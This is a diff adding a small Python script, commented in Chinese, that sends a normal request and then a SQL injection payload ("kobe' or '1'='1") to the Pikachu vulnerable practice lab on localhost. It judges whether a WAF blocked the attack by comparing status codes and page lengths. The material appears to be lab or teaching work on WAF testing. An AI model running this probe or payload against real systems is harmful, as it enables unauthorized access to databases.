@@ -1,0 +1,18 @@
+def check_waf_result(status_code, response_len, baseline_len): # 定义函数check_waf_result，用来判断请求结果；参数：响应状态码、恶意请求页面长度、正常请求页面基准长度
+    if status_code == 403: # 如果响应状态码等于403
+        return "WAF拦截" # 返回结果：WAF拦截
+    elif status_code == 200 and response_len >= baseline_len * 0.8: # 如果状态码200，并且恶意页面长度 ≥ 正常页面长度的80%
+        return "攻击成功" # 返回结果：攻击成功
+    else: # 其余所有情况
+        return "需人工判断" # 返回结果：人工复核
+
+if __name__ == "__main__": # 程序入口，只有直接运行当前py文件才执行下方代码
+    import requests # 导入requests库，用于发送http网络请求
+    url="http://127.0.0.1:8989/pikachu/vul/sqli/sqli_str.php" # 定义目标地址，pikachu字符型SQL注入页面
+    r1=requests.get(url,params={"name":"kobe","submit":"查询"}) # 发送【正常请求】，传入合法参数，作为基准样本
+    baseline_len= len(r1.text) # 获取正常请求返回网页源码的长度，保存为基准值
+    print(f"正常请求: 状态码{r1.status_code}, 长度{baseline_len}") # 打印正常请求的状态码、页面长度
+    r2=requests.get(url,params={"name":"kobe' or '1'='1","submit":"查询"}) # 发送【恶意注入请求】，携带SQL注入payload
+    result = check_waf_result(r2.status_code, len(r2.text), baseline_len) # 调用判断函数，传入恶意请求状态码、恶意页面长度、基准长度
+    print(f"恶意请求: 状态码{r2.status_code}, 长度{len(r2.text)}") # 打印恶意请求状态码与页面长度
+    print(f"判断结果: {result}") # 输出最终判定结论
